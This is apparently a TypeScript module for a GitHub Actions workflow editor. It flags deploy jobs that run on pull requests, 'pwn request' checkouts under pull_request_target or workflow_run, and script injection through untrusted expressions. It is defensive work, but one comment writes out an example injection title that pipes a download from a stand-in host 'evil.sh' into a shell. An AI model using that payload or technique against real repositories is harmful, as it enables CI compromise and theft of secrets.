import { guardsAgainstPullRequests } from "./conditions";
import { stepsFor, template, templateKeys, type Job, type WorkflowModel } from "./model";
import { triggersYaml } from "./yaml";

// Things that are valid YAML and would run, but probably not the way you meant: shown on the job's
// card as warnings, without blocking Save.

export interface Warning {
  job: string;
  message: string;
  /** A one-click fix: the condition to give the job. */
  fix?: { label: string; condition: string };
}

/** The events a workflow runs on, however `on:` is written. */
export function workflowEvents(model: WorkflowModel): string[] {
  const on = triggersYaml(model);
  if (typeof on === "string") return [on];
  if (Array.isArray(on)) return on.map(String);
  return on && typeof on === "object" ? Object.keys(on) : [];
}

const DEPLOY_ACTIONS =
  /actions\/deploy-pages|softprops\/action-gh-release|aws-actions\/|azure\/webapps-deploy|google-github-actions\/deploy|cloudflare\/wrangler-action|peaceiris\/actions-gh-pages/;
const SENSITIVE_SCOPES = ["pages", "id-token", "packages", "deployments"];

/** Whether a job publishes or deploys something, from what it does, not just its name. */
export function deploys(job: Job): boolean {
  if (job.template !== "steps" && template(job.template).group === "ship") return true;
  const keys = { ...templateKeys(job), ...(job.extra ?? {}) };
  if (keys.environment !== undefined) return true;
  const permissions = keys.permissions;
  if (permissions && typeof permissions === "object") {
    const p = permissions as Record<string, unknown>;
    if (SENSITIVE_SCOPES.some((s) => p[s] === "write")) return true;
  }
  if (permissions === "write-all") return true;
  return stepsFor(job).some((s) => {
    if (typeof s.uses === "string" && DEPLOY_ACTIONS.test(s.uses)) return true;
    // docker/build-push-action only publishes with push: true.
    return typeof s.uses === "string" && /docker\/build-push-action/.test(s.uses) && s.with?.push === true;
  });
}

/** The branch a "run only on" fix should use: the one pushes are filtered to, else main. */
export function mainBranch(model: WorkflowModel): string {
  const on = triggersYaml(model) as Record<string, { branches?: unknown } | null> | undefined;
  const branches = on && typeof on === "object" ? on.push?.branches : undefined;
  const first = Array.isArray(branches) ? branches.find((b) => typeof b === "string" && !/[*?[]/.test(b)) : undefined;
  return typeof first === "string" ? first : "main";
}

/**
 * Expressions whose text whoever opens an issue, a pull request or a comment chooses: titles,
 * bodies, branch names, commit messages, author names. Numbers and hashes can't carry commands.
 */
const UNTRUSTED =
  /^(github\.head_ref|github\.event\.[\w.*[\]'"-]*\.(title|body|message|label|ref|head_ref|head_branch|page_name|name|email))$/;

/** The untrusted ${{ }} expressions written straight into a script's text. */
export function injectedExpressions(script: string): string[] {
  return [...script.matchAll(/\$\{\{\s*([^}]+?)\s*\}\}/g)].map((m) => m[1]).filter((e) => UNTRUSTED.test(e));
}

/** A step's script: its run: text, or actions/github-script's script: input. */
function scriptOf(step: { run?: unknown; uses?: unknown; with?: Record<string, unknown> }): string | null {
  if (typeof step.run === "string") return step.run;
  if (typeof step.uses === "string" && /^actions\/github-script@/.test(step.uses)) {
    return typeof step.with?.script === "string" ? step.with.script : null;
  }
  return null;
}

/** Whether a step runs the code of the pull request or run that triggered the workflow. */
function runsTriggeringCode(step: { run?: unknown; uses?: unknown; with?: Record<string, unknown> }): boolean {
  const head =
    /github\.event\.pull_request\.head|github\.head_ref|github\.event\.workflow_run\.head_(sha|branch)|github\.event\.workflow_run\.pull_requests/;
  if (typeof step.uses === "string" && /^actions\/checkout@/.test(step.uses))
    return head.test(String(step.with?.ref ?? ""));
  return (
    typeof step.run === "string" &&
    (/\bgh pr checkout\b/.test(step.run) ||
      /git (checkout|switch|fetch)\b[^\n]*\$\{\{[^}]*(pull_request\.head|head_ref|workflow_run\.head)/.test(step.run))
  );
}

export function warnings(model: WorkflowModel): Warning[] {
  const events = workflowEvents(model);
  const onPullRequests = events.includes("pull_request") || events.includes("pull_request_target");
  const branch = mainBranch(model);
  const found: Warning[] = [];

  for (const job of model.jobs) {
    if (onPullRequests && deploys(job) && !guardsAgainstPullRequests(job.extra?.if)) {
      found.push({
        job: job.id,
        message: `${job.name} also runs on pull requests, so every pull request would ${
          job.extra?.environment !== undefined || job.template !== "steps" ? "deploy" : "publish"
        }. Limit it to ${branch}.`,
        fix: { label: `Only run on ${branch}`, condition: `github.ref == 'refs/heads/${branch}'` },
      });
    }
    // The classic "pwn request": pull_request_target and workflow_run have secrets and write
    // access, and checking out the triggering code runs whatever a stranger put in it.
    const privileged = ["pull_request_target", "workflow_run"].filter((e) => events.includes(e));
    if (privileged.length && stepsFor(job).some(runsTriggeringCode)) {
      const event = privileged[0];
      found.push({
        job: job.id,
        message:
          event === "pull_request_target"
            ? `${job.name} checks out the pull request's own code on pull_request_target, which has your secrets and write access. Anyone can open a pull request, so their code would run with them. Use pull_request instead, or don't run that code.`
            : `${job.name} checks out the code of the run that triggered it on workflow_run, which has your secrets and write access. When that run came from someone's pull request, their code would run with them. Don't run that code here; only read its results.`,
      });
    }
    // Script injection: the text lands in the script before it runs, so a title like
    // "x"; curl evil.sh | sh; " becomes a command. Through env: it stays a plain value.
    stepsFor(job).forEach((step, i) => {
      const script = scriptOf(step);
      const injected = script ? injectedExpressions(script) : [];
      if (!injected.length) return;
      const which = typeof step.name === "string" && step.name ? `"${step.name}"` : `step ${i + 1}`;
      found.push({
        job: job.id,
        message: `${job.name}, ${which}: \${{ ${injected[0]} }} goes straight into the script, and whoever writes that text could make it run commands. Pass it through env: instead (e.g. VALUE: \${{ ${injected[0]} }}) and use "$VALUE".`,
      });
    });
  }
  return found;
}
